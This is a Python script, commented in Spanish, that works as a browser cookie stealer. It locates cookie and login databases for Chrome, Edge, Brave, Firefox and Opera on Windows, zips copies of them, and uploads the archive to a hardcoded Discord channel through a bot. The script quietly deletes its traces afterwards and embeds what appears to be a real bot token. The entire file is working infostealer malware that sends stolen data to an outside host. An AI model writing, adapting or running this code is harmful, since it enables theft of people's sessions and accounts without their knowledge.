import os
import sqlite3
import zipfile
import shutil
import discord
from discord.ext import commands
import requests

TOKEN = "MTMxMDk4NDgxNjA0MDIxNDU4OQ.GOvKp2.20cJ3Kkm1dg0tiNTvfsHX9c4v-HdHPCepCZHIQ"
GUILD_ID = 870347825937018882
CHANNEL_ID = 1310986733093130261

# Función para detectar navegadores y sus rutas de cookies
def get_browser_cookies_path():
    user_path = os.getenv("USERPROFILE")
    paths = {
        "chrome": os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies"),
        "edge": os.path.join(user_path, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies"),
        "brave": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        "firefox": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
        "opera": os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera Stable", "Cookies"),
    }

    detected_paths = {browser: path for browser, path in paths.items() if os.path.exists(path)}
    return detected_paths

# Función para crear un archivo ZIP con los archivos importantes
def create_zip_file(paths, zip_name="cookies_dump.zip"):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for browser, path in paths.items():
            if browser == "firefox":
                # Firefox requiere detección de perfiles
                profile_dirs = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]
                if profile_dirs:
                    path = os.path.join(path, profile_dirs[0], "cookies.sqlite")
            if os.path.exists(path):
                # Crear una copia temporal del archivo porque SQLite podría estar bloqueado
                temp_path = f"{path}.temp"
                try:
                    shutil.copy2(path, temp_path)
                    zipf.write(temp_path, f"{browser}_cookies.sqlite")
                finally:
                    os.remove(temp_path)
    print(f"Archivo ZIP creado: {zip_name}")
    return zip_name

# Configuración del bot de Discord
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user.name} está conectado a Discord.")

    # Detectar los navegadores y crear el archivo ZIP con cookies
    detected_paths = get_browser_cookies_path()
    if not detected_paths:
        print("No se detectaron navegadores con cookies almacenadas.")
        return

    # Crear archivo ZIP
    zip_path = create_zip_file(detected_paths)

    # Acceder al canal
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    if guild:
        channel = guild.get_channel(CHANNEL_ID)
        if channel:
            if os.path.exists(zip_path):
                # Enviar el archivo ZIP al canal
                await channel.send(
                    "Aquí está el archivo .zip con las cookies:",
                    file=discord.File(zip_path)
                )
                print("Archivo enviado con éxito.")
                # Eliminar el archivo ZIP después de enviarlo
                os.remove(zip_path)
                print("Archivo ZIP eliminado después del envío.")
            else:
                print("El archivo ZIP no existe.")
    await bot.close()

# Iniciar el bot
bot.run(TOKEN)